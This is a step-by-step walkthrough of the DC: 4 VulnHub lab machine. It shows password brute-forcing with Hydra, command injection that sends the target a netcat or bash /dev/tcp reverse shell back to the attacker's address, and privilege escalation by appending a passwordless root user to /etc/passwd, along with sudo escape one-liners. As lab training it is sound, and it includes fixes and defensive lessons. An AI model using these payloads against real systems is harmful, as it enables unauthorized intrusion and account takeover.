# DC: 4 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 4 is the fourth machine in the DCAU "DC" series. It is a purposely broken Debian
virtual machine. The whole point is to practice the full penetration-testing cycle:
find the box, enumerate it, break in, move sideways, escalate to root, and read the
flag. This document explains every step as if you have never opened a terminal before.

| Field | Value |
|---|---|
| Machine | DC: 4 |
| Difficulty | **3 — Easy** (stated: *Beginner / Intermediate*) |
| Author | DCAU (http://www.five86.com/dc-4.html) |
| Released | 7 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-4,313/ |
| Download | https://vulnhub.com/entry/dc-4,313/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 32-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery** — finding a hidden machine on your network with `netdiscover`/`nmap`.
- **Service enumeration** — identifying a web server and an SSH service.
- **Brute-forcing a web login** — using Hydra and Burp Suite Intruder with a wordlist.
- **Command injection** — making a web page run operating-system commands for you.
- **Reverse shells** — making the target connect back to you so you get an interactive shell.
- **Credential reuse / lateral movement** — reading a password backup file and a mailbox.
- **SUID / sudo abuse** — turning an innocent-looking `sudo` rule into a root shell.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: a chain is only as strong as each of its links. DC: 4 gives you four
links (weak password, command injection, exposed credentials, bad sudo rule).

## 1. Reconnaissance — finding the target

First, confirm your own IP address. Your Kali box is the "attacker" at
`192.168.56.10`; the target will be `192.168.56.101`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now scan the network for live hosts. `netdiscover` listens for ARP replies, which is a
fast way to find machines that are awake.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:00      1      60  PCS Systemtechnik GmbH
 192.168.56.10   0a:00:27:00:00:01      1      60  PCS Systemtechnik GmbH
 192.168.56.101  0a:00:27:00:00:02      1      60  PCS Systemtechnik GmbH
```

`192.168.56.101` is our target. (MAC addresses and counts vary by build.)

![Netdiscover output showing the target host](images/01-netdiscover.png)

> **Why it works:** ARP is how devices ask "who has this IP?" on a local network. An
> attacker on the same layer-2 segment can listen to every reply and map the network
> without sending a single packet to the target itself. This is passive-ish recon.


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Now find out what services the target is offering. `nmap` probes each port.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    nginx 1.15.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: SSH on 22 and a web server on 80. (Exact versions vary by build.)

![Full nmap scan of DC-4](images/02-nmap.png)

Open the web server in a browser, or with `curl`.

```bash
curl -i http://192.168.56.101/
```

```text
HTTP/1.1 200 OK
Server: nginx/1.15.10
Content-Type: text/html

<html>...
  <title>DC-4</title>
  ... a login form with `username` and `password` fields ...
</html>
```

An admin login page. Let's also look for hidden paths.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

```text
/images               (Status: 301)
/index.php            (Status: 200)
/login.php            (Status: 200)
/logout.php           (Status: 302)
```

## 3. Foothold

### 3.1 Cracking the login

The login form is the first weak link. Try squashing obvious credentials first, then
brute-force with Hydra. DC: 4 reuses a password that appears in common wordlists.


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Logout"
```

```text
[80][http-post-form] host: 192.168.56.101  login: admin  password: happy
1 of 1 target successfully completed, 1 valid password found
```

Credentials: **admin : happy**. (The exact password depends on the build/wordlist, but
`happy` is the classic answer for this box.)

![Successful login as admin](images/03-login.png)

> **Why it works:** A wordlist attack is just trying many passwords quickly. If a user
> picks a dictionary word, the server will eventually say "yes". The `S=Logout` string
> tells Hydra that a response containing "Logout" means the login succeeded.

### 3.2 Command injection

After logging in, there is a diagnostic page that runs a "command" for you — it lists
files. It is a classic command-injection sink.

Navigate to `http://192.168.56.101/command.php` (or click "Command"). The page lets you
"Prepare for an attack" and choose a `radio` option like `ls -l`. Intercept the request
with Burp Suite and send it to Repeater.

Original request body:

```text
radio=ls+-l&submit=Run
```

Replace the value with a reverse shell. Start a listener first on your Kali box.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
rlwrap nc -lvnp 1234
```

Then swap the `radio` value to make the server call back to you:

```text
radio=nc+-e+/bin/sh+192.168.56.10+1234&submit=Run
```

```text
listening on [any] 1234 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 58892
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You are now the web user `www-data`. Upgrade your dumb shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/04-reverse-shell.png)

> **Why it works:** The web app builds a shell command by pasting your input directly
> into a command string. When your input contains shell metacharacters, the shell runs
> *your* command instead of the intended one. Here the app effectively ran
> `nc -e /bin/sh <attacker> <port>`, handing you a shell.

### 3.3 Lateral movement to `jim`

Look around `www-data`'s reachable files. A backup of old passwords is exposed.

```bash
ls -la /home/jim/backups
cat /home/jim/backups/old-passwords.bak
```

```text
... 123456
... jibril04
... password
... happy
```

Serve the file or just copy the list, then brute-force SSH for `jim` with Hydra.

```bash
hydra -l jim -P old-passwords.bak 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101  login: jim  password: jibril04
```

Log in properly over SSH for a stable shell:

```bash
ssh jim@192.168.56.101
```

```text
You have mail.
jim@dc-4:~$
```

![SSH login as jim with the new-mail banner](images/05-ssh-jim.png)

> **Why it works:** `old-passwords.bak` leaks a plaintext list of historical passwords.
> People reuse passwords, so an old password is often a current one. Hydra simply tests
> each entry against the real SSH service.

### 3.4 Reading the mail

That "You have mail" banner is a huge hint. Unix keeps a user's mail in `/var/mail`.

```bash
cat /var/mail/jim
```

```text
From: charles
To: jim
Subject: Password change

Hi Jim, here is the new password for my account: ^xHhA&hvim0y
```

Credentials: **charles : ^xHhA&hvim0y**.


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Check sudo rights

Switch to `charles` and see what he is allowed to run as root.


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
su charles
Password: ^xHhA&hvim0y
sudo -l
```

```text
User charles may run the following command on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

`teehee` is a custom binary that behaves like `tee`: it copies input to a file, and with
`-a` it appends. Because it runs as root, it can write anywhere — including `/etc/passwd`.

### 4.2 Adding a root user

Append a line that creates a new user with UID 0 (the root user ID) and no password.

```bash
echo "cyber::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

Then switch to the user you just created — no password required because the field is empty.

```bash
su cyber
whoami
```

```text
root
```

Read the flag:

```bash
cd /root
cat flag.txt
```

```text
Congratulations! You have found the flag.
```

![Root shell and the flag](images/06-root-flag.png)

> **Why it works:** On Linux, the file `/etc/passwd` defines user accounts by their
> numeric UID. A user with UID `0` *is* root, regardless of the name. The sudo rule let
> `charles` run `teehee` as root, and `teehee -a` appended attacker-controlled text to a
> root-owned file. The empty password field (`::`) means `su` asks for nothing.

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Weak / guessable admin password | Web login (`admin:happy`) | Full admin access to the app | Strong password policy + MFA |
| 2 | OS command injection | "Command" diagnostic page (`radio` param) | Remote code execution as `www-data` | Never pass user input to a shell; use allow-lists |
| 3 | Sensitive file exposure | `backups/old-passwords.bak` readable | Password reuse → SSH login as `jim` | Remove backups; store secrets encrypted |
| 4 | Credentials in plaintext mail | `/var/mail/jim` | Account takeover (`charles`) | Never email plaintext passwords |
| 5 | Unsafe sudo binary | `sudo -l` → `NOPASSWD: /usr/bin/teehee` | Root via `/etc/passwd` rewrite | Least privilege; audit custom setuid/sudo tools |

## 6. Defensive lessons (blue team)

- **Treat every input as hostile.** Command injection exists because user text reached a
  shell. Use parameterised APIs, never `system()`/`popen()` with raw input, and validate
  against an allow-list.
- **Passwords are not secrets if you write them down.** Backups and mail spools are
  attacker gold. Store hashes, use a secrets manager, and never email credentials.
- **Reuse turns one leak into many.** Randomise per-service credentials; rotate immediately.
- **Audit `sudo -l` and SUID binaries regularly.** Any binary that writes files or spawns
  a shell when run as root is a privilege-escalation primitive (see GTFOBins).
- **Detect the attack.** A reverse shell appears as an outbound connection from the web
  server to an unusual host. Alert on it. Log and rate-limit login failures.
- **Segment networks.** A web server should not be able to reach your workstation's
  arbitrary ports; egress filtering blocks the callback.

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — https://vulnhub.com/entry/dc-4,313/
- DCAU series home — http://www.five86.com/dc-4.html
- GTFOBins (sudo/SUID abuses) — https://gtfobins.github.io/
- Hydra documentation — https://github.com/vanhauser-thc/thc-hydra
- OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection
- reverse-shell / revshells generator — https://www.revshells.com/
- Exploit-DB (general) — https://www.exploit-db.com/

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-netdiscover.png` — host discovery showing `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan (ports 22 and 80)
- [ ] `images/03-login.png` — successful `admin:happy` web login
- [ ] `images/04-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/05-ssh-jim.png` — SSH login as `jim` with mail banner
- [ ] `images/06-root-flag.png` — root shell and `flag.txt` contents
